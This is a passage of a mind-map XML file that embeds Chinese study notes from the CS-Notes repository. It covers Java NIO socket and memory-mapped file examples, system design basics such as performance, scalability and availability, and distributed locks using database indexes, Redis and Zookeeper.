                    ServerSocketChannel ssChannel1 = (ServerSocketChannel) key.channel();
                    // 服务器会为每个新连接创建一个 SocketChannel
                    SocketChannel sChannel = ssChannel1.accept();
                    sChannel.configureBlocking(false);
                    // 这个新连接主要用于从客户端读取数据
                    sChannel.register(selector, SelectionKey.OP_READ);
                } else if (key.isReadable()) {
                    SocketChannel sChannel = (SocketChannel) key.channel();
                    System.out.println(readDataFromSocketChannel(sChannel));
                    sChannel.close();
                }
                keyIterator.remove();
            }
        }
    }
    private static String readDataFromSocketChannel(SocketChannel sChannel) throws IOException {
        ByteBuffer buffer = ByteBuffer.allocate(1024);
        StringBuilder data = new StringBuilder();
        while (true) {
            buffer.clear();
            int n = sChannel.read(buffer);
            if (n == -1) {
                break;
            }
            buffer.flip();
            int limit = buffer.limit();
            char[] dst = new char[limit];
            for (int i = 0; i &lt; limit; i++) {
                dst[i] = (char) buffer.get(i);
            }
            data.append(dst);
            buffer.clear();
        }
        return data.toString();
    }
}</pre>
    <pre>public class NIOClient {
    public static void main(String[] args) throws IOException {
        Socket socket = new Socket(&quot;127.0.0.1&quot;, 8888);
        OutputStream out = socket.getOutputStream();
        String s = &quot;hello world&quot;;
        out.write(s.getBytes());
        out.close();
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1428184685" CREATED="1754750650849" MODIFIED="1754750650851"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      内存映射文件
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 内存映射文件" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#内存映射文件">
</a>
    <p dir="auto">
      内存映射文件 I/O 是一种读和写文件数据的方法，它可以比常规的基于流或者基于通道的 I/O 快得多。
    </p>
    <p dir="auto">
      向内存映射文件写入可能是危险的，只是改变数组的单个元素这样的简单操作，就可能会直接修改磁盘上的文件。修改数据与将数据保存到磁盘是没有分开的。
    </p>
    <p dir="auto">
      下面代码行将文件的前 1024 个字节映射到内存中，map() 方法返回一个 MappedByteBuffer，它是 ByteBuffer 的子类。因此，可以像使用其他任何 ByteBuffer 一样使用新映射的缓冲区，操作系统会在需要时负责执行映射。
    </p>
    <pre>MappedByteBuffer mbb = fc.map(FileChannel.MapMode.READ_WRITE, 0, 1024);</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_505400719" CREATED="1754750650851" MODIFIED="1754750650852"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      对比
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 对比" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#对比">
</a>
    <p dir="auto">
      NIO 与普通 I/O 的区别主要有以下两点：
    </p>
    <ul dir="auto">
      <li>
        NIO 是非阻塞的；
      </li>
      <li>
        NIO 面向块，I/O 面向流。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1566351105" CREATED="1754750650854" MODIFIED="1754750650855"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      八、参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 八、参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#八参考资料">
</a>
    <ul dir="auto">
      <li>
        Eckel B, 埃克尔, 昊鹏, 等. Java 编程思想 [M]. 机械工业出版社, 2002.
      </li>
      <li>
        <a href="https://www.ibm.com/developerworks/cn/education/java/j-nio/j-nio.html" rel="nofollow">IBM: NIO 入门</a>
      </li>
      <li>
        <a href="http://tutorials.jenkov.com/java-nio/index.html" rel="nofollow">Java NIO Tutorial</a>
      </li>
      <li>
        <a href="https://tech.meituan.com/nio.html" rel="nofollow">Java NIO 浅析</a>
      </li>
      <li>
        <a href="https://www.ibm.com/developerworks/cn/java/j-lo-javaio/index.html" rel="nofollow">IBM: 深入分析 Java I/O 的工作机制</a>
      </li>
      <li>
        <a href="https://www.ibm.com/developerworks/cn/java/j-lo-chinesecoding/index.html" rel="nofollow">IBM: 深入分析 Java 中的中文编码问题</a>
      </li>
      <li>
        <a href="https://www.ibm.com/developerworks/cn/java/j-lo-serial/index.html" rel="nofollow">IBM: Java 序列化的高级认识</a>
      </li>
      <li>
        <a href="http://blog.csdn.net/shimiso/article/details/24990499" rel="nofollow">NIO 与传统 IO 的区别</a>
      </li>
      <li>
        <a href="http://stg-tud.github.io/sedc/Lecture/ws13-14/5.3-Decorator.html#mode=document" rel="nofollow">Decorator Design Pattern</a>
      </li>
      <li>
        <a href="http://labojava.blogspot.com/2012/12/socket-multicast.html" rel="nofollow">Socket Multicast</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" POSITION="top_or_left" ID="ID_1269920250" CREATED="1754749744679" MODIFIED="1754749809790" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>系统设计</strong>
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_685313239" CREATED="1754749809768" MODIFIED="1754750675624" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      系统设计基础
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_352990377" CREATED="1754750650857" MODIFIED="1754750650857"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、性能
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_945031694" CREATED="1754750650858" MODIFIED="1754750650858"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      性能指标
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1961625649" CREATED="1754750650860" MODIFIED="1754750650861"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 响应时间
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 响应时间" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#1-响应时间">
</a>
    <p dir="auto">
      指某个请求从发出到接收到响应消耗的时间。
    </p>
    <p dir="auto">
      在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_426693133" CREATED="1754750650862" MODIFIED="1754750650863"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 吞吐量
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 吞吐量" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#2-吞吐量">
</a>
    <p dir="auto">
      指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1672997822" CREATED="1754750650864" MODIFIED="1754750650865"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 并发用户数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 并发用户数" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#3-并发用户数">
</a>
    <p dir="auto">
      指系统能同时处理的并发用户请求数量。
    </p>
    <p dir="auto">
      在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。例如系统支持的吞吐量为 100 req/s，那么平均响应时间应该为 0.01s。
    </p>
    <p dir="auto">
      目前的大型系统都支持多线程来处理并发请求，多线程能够提高吞吐量以及缩短响应时间，主要有两个原因：
    </p>
    <ul dir="auto">
      <li>
        多 CPU
      </li>
      <li>
        IO 等待时间
      </li>
    </ul>
    <p dir="auto">
      使用 IO 多路复用等方式，系统在等待一个 IO 操作完成的这段时间内不需要被阻塞，可以去处理其它请求。通过将这个等待时间利用起来，使得 CPU 利用率大大提高。
    </p>
    <p dir="auto">
      并发用户数不是越高越好，因为如果并发用户数太高，系统来不及处理这么多的请求，会使得过多的请求需要等待，那么响应时间就会大大提高。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_135382501" CREATED="1754750650865" MODIFIED="1754750650865"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      性能优化
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1876750853" CREATED="1754750650867" MODIFIED="1754750650868"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 集群
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 集群" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#1-集群">
</a>
    <p dir="auto">
      将多台服务器组成集群，使用负载均衡将请求转发到集群中，避免单一服务器的负载压力过大导致性能降低。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_374541857" CREATED="1754750650869" MODIFIED="1754750650873"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 缓存
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 缓存" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#2-缓存">
</a>
    <p dir="auto">
      缓存能够提高性能的原因如下：
    </p>
    <ul dir="auto">
      <li>
        缓存数据通常位于内存等介质中，这种介质对于读操作特别快；
      </li>
      <li>
        缓存数据可以位于靠近用户的地理位置上；
      </li>
      <li>
        可以将计算结果进行缓存，从而避免重复计算。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_177522055" CREATED="1754750650874" MODIFIED="1754750650876"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 异步
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 异步" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#3-异步">
</a>
    <p dir="auto">
      某些流程可以将操作转换为消息，将消息发送到消息队列之后立即返回，之后这个操作会被异步处理。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_621653524" CREATED="1754750650876" MODIFIED="1754750650878"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、伸缩性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二、伸缩性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#二伸缩性">
</a>
    <p dir="auto">
      指不断向集群中添加服务器来缓解不断上升的用户并发访问压力和不断增长的数据存储需求。
    </p>
  </body>
</html></richcontent>
<node ID="ID_67038033" CREATED="1754750650878" MODIFIED="1754750650880"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      伸缩性与性能
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 伸缩性与性能" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#伸缩性与性能">
</a>
    <p dir="auto">
      如果系统存在性能问题，那么单个用户的请求总是很慢的；
    </p>
    <p dir="auto">
      如果系统存在伸缩性问题，那么单个用户的请求可能会很快，但是在并发数很高的情况下系统会很慢。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1026224452" CREATED="1754750650880" MODIFIED="1754750650882"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      实现伸缩性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 实现伸缩性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#实现伸缩性">
</a>
    <p dir="auto">
      应用服务器只要不具有状态，那么就可以很容易地通过负载均衡器向集群中添加新的服务器。
    </p>
    <p dir="auto">
      关系型数据库的伸缩性通过 Sharding 来实现，将数据按一定的规则分布到不同的节点上，从而解决单台存储服务器的存储空间限制。
    </p>
    <p dir="auto">
      对于非关系型数据库，它们天生就是为海量数据而诞生，对伸缩性的支持特别好。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_860930970" CREATED="1754750650882" MODIFIED="1754750650885"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、扩展性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 三、扩展性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#三扩展性">
</a>
    <p dir="auto">
      指的是添加新功能时对现有系统的其它应用无影响，这就要求不同应用具备低耦合的特点。
    </p>
    <p dir="auto">
      实现可扩展主要有两种方式：
    </p>
    <ul dir="auto">
      <li>
        使用消息队列进行解耦，应用之间通过消息传递进行通信；
      </li>
      <li>
        使用分布式服务将业务和可复用的服务分离开来，业务使用分布式服务框架调用可复用的服务。新增的产品可以通过调用可复用的服务来实现业务逻辑，对其它产品没有影响。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1282709402" CREATED="1754750650885" MODIFIED="1754750650885"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、可用性
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_677518255" CREATED="1754750650886" MODIFIED="1754750650888"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      冗余
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 冗余" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#冗余">
</a>
    <p dir="auto">
      保证高可用的主要手段是使用冗余，当某个服务器故障时就请求其它服务器。
    </p>
    <p dir="auto">
      应用服务器的冗余比较容易实现，只要保证应用服务器不具有状态，那么某个应用服务器故障时，负载均衡器将该应用服务器原先的用户请求转发到另一个应用服务器上，不会对用户有任何影响。
    </p>
    <p dir="auto">
      存储服务器的冗余需要使用主从复制来实现，当主服务器故障时，需要提升从服务器为主服务器，这个过程称为切换。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_497064407" CREATED="1754750650888" MODIFIED="1754750650890"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      监控
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 监控" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#监控">
</a>
    <p dir="auto">
      对 CPU、内存、磁盘、网络等系统负载信息进行监控，当某个信息达到一定阈值时通知运维人员，从而在系统发生故障之前及时发现问题。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_214822166" CREATED="1754750650890" MODIFIED="1754750650891"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      服务降级
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 服务降级" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#服务降级">
</a>
    <p dir="auto">
      服务降级是系统为了应对大量的请求，主动关闭部分功能，从而保证核心功能可用。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_320834583" CREATED="1754750650892" MODIFIED="1754750650893"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、安全性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 五、安全性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#五安全性">
</a>
    <p dir="auto">
      要求系统在应对各种攻击手段时能够有可靠的应对措施。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1594781607" CREATED="1754750650894" MODIFIED="1754750650895"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        大型网站技术架构：核心原理与案例分析
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1881079406" CREATED="1754749809771" MODIFIED="1754750727678" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      分布式
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1234828585" CREATED="1754750650898" MODIFIED="1754750650899"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、分布式锁
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 一、分布式锁" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#一分布式锁">
</a>
    <p dir="auto">
      在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。
    </p>
    <p dir="auto">
      阻塞锁通常使用互斥量来实现：
    </p>
    <ul dir="auto">
      <li>
        互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态；
      </li>
      <li>
        互斥量为 1 表示未锁定状态。
      </li>
    </ul>
    <p dir="auto">
      1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1624987345" CREATED="1754750650900" MODIFIED="1754750650902"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      数据库的唯一索引
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 数据库的唯一索引" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#数据库的唯一索引">
</a>
    <p dir="auto">
      获得锁时向表中插入一条记录，释放锁时删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否处于锁定状态。
    </p>
    <p dir="auto">
      存在以下几个问题：
    </p>
    <ul dir="auto">
      <li>
        锁没有失效时间，解锁失败的话其它进程无法再获得该锁；
      </li>
      <li>
        只能是非阻塞锁，插入失败直接就报错了，无法重试；
      </li>
      <li>
        不可重入，已经获得锁的进程也必须重新获取锁。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_574881712" CREATED="1754750650903" MODIFIED="1754750650904"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Redis 的 SETNX 指令
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Redis 的 SETNX 指令" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#redis-的-setnx-指令">
</a>
    <p dir="auto">
      使用 SETNX（set if not exist）指令插入一个键值对，如果 Key 已经存在，那么会返回 False，否则插入成功并返回 True。
    </p>
    <p dir="auto">
      SETNX 指令和数据库的唯一索引类似，保证了只存在一个 Key 的键值对，那么可以用一个 Key 的键值对是否存在来判断是否存于锁定状态。
    </p>
    <p dir="auto">
      EXPIRE 指令可以为一个键值对设置一个过期时间，从而避免了数据库唯一索引实现方式中释放锁失败的问题。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_80451050" CREATED="1754750650905" MODIFIED="1754750650906"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Redis 的 RedLock 算法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Redis 的 RedLock 算法" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#redis-的-redlock-算法">
</a>
    <p dir="auto">
      使用了多个 Redis 实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。
    </p>
    <ul dir="auto">
      <li>
        尝试从 N 个互相独立 Redis 实例获取锁；
      </li>
      <li>
        计算获取锁消耗的时间，只有时间小于锁的过期时间，并且从大多数（N / 2 + 1）实例上获取了锁，才认为获取锁成功；
      </li>
      <li>
        如果获取锁失败，就到每个实例上释放锁。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_945411369" CREATED="1754750650907" MODIFIED="1754750650907"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Zookeeper 的有序节点
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1524646947" CREATED="1754750650908" MODIFIED="1754750650910"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. Zookeeper 抽象模型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. Zookeeper 抽象模型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#1-zookeeper-抽象模型">
</a>
    <p dir="auto">
      Zookeeper 提供了一种树形结构的命名空间，/app1/p_1 节点的父节点为 /app1。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8073087fdf89952b1012e70be0a1e78076fd431056491809e70d6ef82a2d845f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61656661383034322d313566612d346538622d396635302d3230623238326132633632342e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/8073087fdf89952b1012e70be0a1e78076fd431056491809e70d6ef82a2d845f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61656661383034322d313566612d346538622d396635302d3230623238326132633632342e706e67" width="320px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/aefa8042-15fa-4e8b-9f50-20b282a2c624.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1946043145" CREATED="1754750650910" MODIFIED="1754750650911"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 节点类型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 节点类型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#2-节点类型">
</a>
    <ul dir="auto">
      <li>
        永久节点：不会因为会话结束或者超时而消失；
      </li>
      <li>
        临时节点：如果会话结束或者超时就会消失；
      </li>
      <li>
        有序节点：会在节点名的后面加一个数字后缀，并且是有序的，例如生成的有序节点为 /lock/node-0000000000，它的下一个有序节点则为 /lock/node-0000000001，以此类推。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1348032041" CREATED="1754750650912" MODIFIED="1754750650913"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 监听器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 监听器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#3-监听器">
</a>
    <p dir="auto">
      为一个节点注册监听器，在节点状态发生改变时，会给客户端发送消息。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_746354486" CREATED="1754750650914" MODIFIED="1754750650915"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 分布式锁实现
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 分布式锁实现" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#4-分布式锁实现">
</a>
    <ul dir="auto">
      <li>
        创建一个锁目录 /lock；
      </li>
      <li>
        当一个客户端需要获取锁时，在 /lock 下创建临时的且有序的子节点；
      </li>
      <li>
        客户端获取 /lock 下的子节点列表，判断自己创建的子节点是否为当前子节点列表中序号最小的子节点，如果是则认为获得锁；否则监听自己的前一个子节点，获得子节点的变更通知后重复此步骤直至获得锁；
      </li>
      <li>
        执行业务代码，完成后，删除对应的子节点。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1125927502" CREATED="1754750650916" MODIFIED="1754750650918"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 会话超时
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. 会话超时" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#5-会话超时">
</a>
    <p dir="auto">
      如果一个已经获得锁的会话超时了，因为创建的是临时节点，所以该会话对应的临时节点会被删除，其它会话就可以获得锁了。可以看到，这种实现方式不会出现数据库的唯一索引实现方式释放锁失败的问题。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1059705711" CREATED="1754750650919" MODIFIED="1754750650921"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 羊群效应
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 6. 羊群效应" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#6-羊群效应">
</a>
    <p dir="auto">
      一个节点未获得锁，只需要监听自己的前一个子节点，这是因为如果监听所有的子节点，那么任意一个子节点状态改变，其它所有子节点都会收到通知（羊群效应，一只羊动起来，其它羊也会一哄而上），而我们只希望它的后一个子节点收到通知。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1893743504" CREATED="1754750650921" MODIFIED="1754750650923"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、分布式事务
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二、分布式事务" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#二分布式事务">
</a>
    <p dir="auto">
      指事务的操作位于不同的节点上，需要保证事务的 ACID 特性。
    </p>
    <p dir="auto">
      例如在下单场景下，库存和订单如果不在同一个节点上，就涉及分布式事务。
    </p>
    <p dir="auto">
      分布式锁和分布式事务区别：
    </p>
    <ul dir="auto">
      <li>
        锁问题的关键在于进程操作的互斥关系，例如多个进程同时修改账户的余额，如果没有互斥关系则会导致该账户的余额不正确。
      </li>
      <li>
        而事务问题的关键则在于事务涉及的一系列操作需要满足 ACID 特性，例如要满足原子性操作则需要这些操作要么都执行，要么都不执行。
      </li>
    </ul>
  </body>
</html></richcontent>
